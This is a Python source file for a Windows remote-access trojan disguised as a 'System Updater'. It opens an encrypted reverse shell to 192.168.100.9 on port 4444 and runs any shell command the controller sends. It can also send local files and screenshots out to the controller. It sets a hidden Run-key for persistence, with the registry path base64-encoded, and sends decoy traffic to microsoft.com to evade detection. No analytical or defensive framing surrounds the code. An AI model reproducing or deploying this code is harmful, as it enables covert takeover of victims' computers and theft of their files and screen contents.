import socket
import subprocess
import os
import platform
import time
import random
import base64
from cryptography.fernet import Fernet
from PIL import Image
import io
import pyautogui
import requests
import winreg
import struct

def send_data(s, fernet, data):
    try:
        encrypted_data = fernet.encrypt(data)
        s.sendall(struct.pack('<I', len(encrypted_data)))
        s.sendall(encrypted_data)
    except (socket.error, BrokenPipeError, ConnectionResetError):
        pass

def recv_data(s, fernet):
    try:
        packed_len = s.recv(4)
        if not packed_len:
            return None
        msg_len = struct.unpack('<I', packed_len)[0]

        full_msg = b''
        while len(full_msg) < msg_len:
            chunk = s.recv(msg_len - len(full_msg))
            if not chunk:
                return None
            full_msg += chunk
        
        return fernet.decrypt(full_msg)
    except (socket.error, struct.error, BrokenPipeError, ConnectionResetError):
        return None

def add_persistence():
    if platform.system() == "Windows":
        key_path = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, "SystemUpdater", 0, winreg.REG_SZ, f'"{os.path.abspath(__file__)}.exe"')
            winreg.CloseKey(reg_key)
        except:
            pass

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format="PNG")
    return img_byte_arr.getvalue()

def handle_command(cmd, s, fernet):
    if cmd.startswith("cd "):
        try:
            new_dir = cmd.split(" ", 1)[1].strip()
            if new_dir:
                os.chdir(new_dir)
                new_cwd = os.getcwd()
                send_data(s, fernet, f"Changed directory to {new_cwd}".encode())
            else:
                send_data(s, fernet, os.getcwd().encode())
        except FileNotFoundError:
            send_data(s, fernet, b"Directory not found")
        except Exception as e:
            send_data(s, fernet, f"Error changing directory: {str(e)}".encode())
    elif cmd.startswith("upload:"):
        file_path = cmd.split(":")[1]
        try:
            with open(file_path, "rb") as f:
                send_data(s, fernet, f.read())
        except:
            send_data(s, fernet, b"File not found")
    elif cmd == "screenshot":
        send_data(s, fernet, capture_screenshot())
    else:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, errors='ignore')
            output = result.stdout + result.stderr
            send_data(s, fernet, output.encode())
        except Exception as e:
            send_data(s, fernet, str(e).encode())

def blend_traffic():
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        requests.get("https://www.microsoft.com", headers=headers, timeout=5)
    except:
        pass

KEY_FILE = "secret.key"
try:
    with open(KEY_FILE, "rb") as f:
        key = f.read().decode()
except FileNotFoundError:
    key = "lHMpfXbi2kdfRzKjvUyj-E-2IY4sWyF_EoCp2sU7siU=" # Fallback to hardcoded key if file not found

def reverse_shell(host="192.168.100.9", port=4444, key=key):
    fernet = Fernet(key.encode())
    add_persistence()

    while True:
        try:
            blend_traffic()
            time.sleep(random.randint(1, 10))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            while True:
                cmd_data = recv_data(s, fernet)
                if not cmd_data:
                    break
                cmd = cmd_data.decode()
                if cmd.lower() == "exit":
                    break
                handle_command(cmd, s, fernet)
        except (socket.error, ConnectionResetError, BrokenPipeError):
            time.sleep(5)
            continue
        except Exception:
            time.sleep(5)
            continue
        finally:
            s.close()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="System Updater")
    parser.add_argument("--host", default="192.168.100.9", help="Host to connect to")
    parser.add_argument("--port", type=int, default=4444, help="Port to connect to")
    parser.add_argument("--key", default="lHMpfXbi2kdfRzKjvUyj-E-2IY4sWyF_EoCp2sU7siU=", help="Encryption key")
    args = parser.parse_args()
    reverse_shell(host=args.host, port=args.port, key=args.key)
